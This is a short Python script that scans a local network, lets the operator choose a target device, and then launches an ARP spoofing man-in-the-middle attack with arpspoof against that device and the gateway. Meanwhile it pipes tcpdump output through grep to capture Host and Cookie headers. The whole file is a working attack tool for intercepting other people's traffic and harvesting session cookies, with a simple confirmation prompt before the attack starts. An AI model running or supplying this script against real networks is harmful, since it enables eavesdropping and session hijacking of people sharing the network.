import os
import ipscanner

network_id = '192.168.0'
#network_id = '192.168.123'
interface_name = 'wlan0'

def logprint(log_str):
	print('-'*5, log_str, '-'*5, sep='')

os.system('./01_ip_forwarding_on')
logprint('IP FORWARDING ON')

logprint('IP SCAN START')
res = ipscanner.scan(network_id)
logprint('IP SCAN FINISH')
ip_list = ipscanner.ip_print(res)

logprint('SELECT IP')
for i in range(len(ip_list)):
	print(i, ip_list[i])
i = int(input())
selected = ip_list[i]

logprint('target INFORMATION')
try:
	print('ip', selected[0], sep='\t')
	print('mac', selected[1], sep='\t')
	print('corporation', selected[2], sep='\t')
except:
	pass

logprint('ARP SPOOFING READY\nPRESS "1" to start attack')
inputnum = int(input())
if(inputnum != 1):
	print("attack stopped")
	exit()

os.system("arpspoof -i "+interface_name+" -t "+selected[0]+' '+network_id+".1"+" & "\
+'tcpdump -l -v -i '+interface_name+' | grep -E "Host|Cookie"')


